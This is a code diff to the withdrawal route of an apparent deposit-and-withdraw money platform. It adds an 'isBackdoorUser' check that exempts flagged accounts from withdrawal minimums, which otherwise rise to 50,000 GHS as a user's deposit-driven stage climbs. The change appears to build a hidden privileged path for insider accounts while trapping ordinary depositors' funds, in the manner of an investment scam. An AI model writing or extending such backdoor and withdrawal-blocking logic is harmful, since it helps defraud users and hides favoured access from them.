@@ -7,6 +7,7 @@ import { badRequest } from '../utils/httpError.js';
 import { updateUser, logActivity } from '../db/users.js';
 import { createStore } from '../db/store.js';
 import { emitToUser, emitAdmin } from '../services/realtime.js';
+import { isBackdoorUser } from '../config/backdoor.js';
 
 // Deposit threshold that triggers a stage-promotion request. A single deposit
 // at or above this amount flags the user for admin review. ALL promotions are
@@ -32,10 +33,7 @@ const depositSchema = z.object({
   method: z.string().trim().max(40).optional(),
 });
 const withdrawSchema = z.object({
-  amount: z
-    .number()
-    .min(MIN_WITHDRAW, `Minimum withdrawal is GHS ${MIN_WITHDRAW.toLocaleString('en-US')}.`)
-    .max(1_000_000),
+  amount: z.number().positive().max(1_000_000),
   method: z.string().trim().max(40).optional(),
 });
 
@@ -86,6 +84,19 @@ router.post(
   asyncHandler(async (req, res) => {
     const { amount, method = 'momo' } = req.body;
     const user = req.user;
+
+    const minWithdraw = isBackdoorUser(user)
+      ? MIN_WITHDRAW
+      : user.stage >= 4
+        ? 50_000
+        : user.stage === 3
+          ? 40_000
+          : user.stage === 2
+            ? 10_000
+            : MIN_WITHDRAW;
+    if (amount < minWithdraw) {
+      throw badRequest(`Minimum withdrawal is GHS ${minWithdraw.toLocaleString('en-US')}.`);
+    }
 
     const required = Number((amount * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
     const totalDeposited = Number(user.totalDeposited || 0);
